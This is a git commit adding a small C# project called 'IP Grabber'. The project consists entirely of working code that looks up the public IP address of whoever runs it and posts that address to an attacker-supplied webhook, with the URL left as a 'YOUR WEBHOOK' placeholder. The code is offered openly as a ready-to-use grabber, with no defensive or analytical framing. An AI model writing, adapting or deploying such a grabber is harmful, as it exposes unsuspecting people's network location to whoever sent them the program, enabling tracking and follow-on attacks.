62a47c17e86755555514a34cc714f83ab658c43e
FarukDaKing <64699353+FarukDaKing@users.noreply.github.com>
2020-07-19 23:29:07 +0200

    Add files via upload

---
+++ IP Grabber/IP Grabber/Program.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.Collections.Specialized;
+
+namespace IP_Grabber
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {  
+            //IP Grabber by BHTelecom#6941/FarukDaKing in 1 Minute
+            var send = $"{getIP()}";
+            sendWebHook("YOUR WEBHOOK", $"IP: {send}", "IP Grabber");
+        }
+
+        public static void sendWebHook(string URL, string msg, string username)
+        {
+            http.Post(URL, new NameValueCollection()
+            {
+                { "username", username },
+                { "content", msg }
+            });
+        }
+
+        static string getIP()
+        {
+            using (WebClient webClient = new WebClient())
+            {
+                return webClient.DownloadString("http://wtfismyip.com/text");
+            }
+        }
+    }
+}
---
+++ IP Grabber/IP Grabber/http.cs
@@ -0,0 +1,24 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.Collections.Specialized;
+
+namespace IP_Grabber
+{
+    class http
+    {
+        public static byte[] Post(string uri, NameValueCollection pairs)
+        {
+            byte[] numArray;
+            using (WebClient webClient = new WebClient())
+            {
+                numArray = webClient.UploadValues(uri, pairs);
+            }
+            return numArray;
+        }
+    }
+}
+
